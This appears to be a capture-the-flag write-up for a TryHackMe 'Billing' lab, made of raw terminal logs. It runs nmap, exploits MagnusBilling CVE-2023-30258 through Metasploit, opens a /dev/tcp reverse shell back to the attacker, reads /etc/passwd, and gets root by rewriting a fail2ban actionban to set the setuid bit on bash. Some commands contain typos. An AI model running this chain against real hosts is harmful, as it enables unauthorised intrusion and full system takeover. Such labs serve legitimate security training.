
[ started it with a nmap scan ]

┌──(kali㉿kali)-[~/vpn]
└─$ nmap -p- 10.48.148.66 --min-rate=1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 09:59 -0500
Nmap scan report for 10.48.148.66
Host is up (0.050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 69.36 seconds
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[ While the scan was running we did a search for Magnus because in the web interface we can see `MagnusBilling`]
                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/vpn]
└─$ searchsploit Magnus           
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MagnusSolution magnusbilling 7.3.0 - Command Injection                                                                                                                            | multiple/webapps/52170.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                        
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[ The other nmap results came right after I ran searchsploit ]

┌──(kali㉿kali)-[~/vpn]
└─$ nmap -p22,80,330,5038 -A 10.48.148.66 --min-rate=1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 10:03 -0500
Nmap scan report for 10.48.148.66
Host is up (0.051s latency).

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 06:b0:62:d5:9b:8a:f6:16:1d:4e:f3:9d:37:21:53:0a (ECDSA)
|_  256 e5:40:e3:9a:f0:ad:bc:1f:d7:bf:01:92:38:76:bc:4f (ED25519)
80/tcp   open   http     Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.48.148.66/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
330/tcp  closed unknown
5038/tcp open   asterisk Asterisk Call Manager 2.10.6
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=2/3%OT=22%CT=330%CU=30876%PV=Y%DS=3%DC=T%G=Y%TM=69820E
OS:6B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=106%TI=Z
OS:%CI=Z%II=I%TS=B)SEQ(SP=F5%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GC
OS:D=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 330/tcp)
HOP RTT      ADDRESS
1   49.59 ms 192.168.128.1
2   ...
3   49.57 ms 10.48.148.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.98 seconds
                                     
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[ We fire up Metasploit to confirm the vulnerability ]

┌──(kali㉿kali)-[~/THM/Billing]
└─$ msfconsole -q            
msf > search Magnus

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

[ The only necessary options were `LPORT` and `RHOSTS`]
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST <ip>
LHOST => <ip>
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS <ip>
RHOSTS => <ip>
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on <ip>:<port> 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.48.148.66:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 8 seconds.
[*] Elapsed time: 8.18 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (41224 bytes) to 10.48.148.66
[+] Deleted fYQshQSFxjLKQ.php
[*] Meterpreter session 1 opened (<ip>:<port> -> 10.48.148.66:52298) at 2026-02-03 10:07:23 -0500

[ We then used this to get a shell in nc ]
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

#Got :

┌──(kali㉿kali)-[~/THM/Billing]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.199.3] from (UNKNOWN) [10.48.148.66] 55990
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell
asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ ls
ls
icepay-cc.php

# From :

meterpreter > execute -f bash -a "-c 'bash -i >& /dev/tcp/192.168.199.3/5555 0>&1'" -H                 
Process 2581 created. 
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[ Reveals the /etc/passwd folder : `asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ cat /etc/passwd` ]

[ User Flag ]
asterisk@ip-10-48-148-66:/home/magnus$ cat user.txt
cat user.txt
THM{Do_IT_Yourself}
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[ Privilege Escalation ]

└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [<ip>] from (UNKNOWN) [10.48.148.66] 59320
bash: cannot set terminal process group (1222): Inappropriate ioctl for device
bash: no job control in this shell

[Checking the sudo privileges for the asterisk user, we find that the user is allowed to run the fail2ban-client command as root without a password:]

`fail2ban-client is a command-line interface that allows us to interact with, configure, and control the fail2ban-server. To give a brief explanation, fail2ban is a security tool that monitors log files for suspicious activities (such as repeated failed login attempts) and bans the offending IP addresses by updating firewall rules.`

# Checking the running processes, fail2ban-server is running as root, as expected.

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ ps -aux | grep fail
<r/www/html/mbilling/lib/icepay$ ps -aux | grep fail        
root         854  0.2  1.5 1171732 30936 ?       Ssl  04:59   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
asterisk    2585  0.0  0.0   3328  1516 ?        S    05:19   0:00 grep fail

[ Checking the status of the fail2ban-server, we see 8 active jails. ] 

`Jails are basically configurations that define which logs to monitor, the patterns to look for, and the actions to take when a pattern is matched.`
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client status
<ng/lib/icepay$ sudo /usr/bin/fail2ban-client status        
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd

[ First, we retrieve the currently set actions for one of the active jails. ]
asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
<r/bin/fail2ban-client get asterisk-iptables actions        
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
__________________________________________________________________________________________________________________________________________________________________________________________________________
__________________________________________________________________________________________________________________________________________________________________________________________________________

[Next, we modify the command for the actionban in the iptables-allports-ASTERISK action, which is executed when banning an IP for the asterisk-iptables jail. We set it to run our command that sets the setuid bit on /bin/bash instead, as follows:]

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ udo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<ptables action iptables-allports-ASTERISK actionban        
bash: udo: command not found

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<ptables action iptables-allports-ASTERISK actionban        
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set asterisk-tables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
<es-allports-ASTERISK actionban 'chmod +s /bin/bash'        
chmod +s /bin/bash

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client get asterisk-tables action iptables-allports-ASTERISK actionban
<ptables action iptables-allports-ASTERISK actionban        
chmod +s /bin/bash

[Now, we can manually ban an IP address for the asterisk-iptables jail, which will execute the command for actionban defined in the iptables-allports-ASTERISK action.]

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$  ls -la /bin/bash
 ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 18  2025 /bin/bash

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set asterisk-tables banip 1.2.3.4
<fail2ban-client set asterisk-iptables banip 1.2.3.4        
1

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash

asterisk@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ /bin/bash -p
/bin/bash -p
 python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'

root@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay# wc -c /root/root.txt
wc -c /root/root.txt
38 /root/root.txt

root@ip-10-48-148-66:/var/www/html/mbilling/lib/icepay# cat /root/root.txt
cat /root/root.txt
THM{DO_IT_YOURSELF}

ip-10-48-148-66:/var/www/html/mbilling/lib/icepay$ 
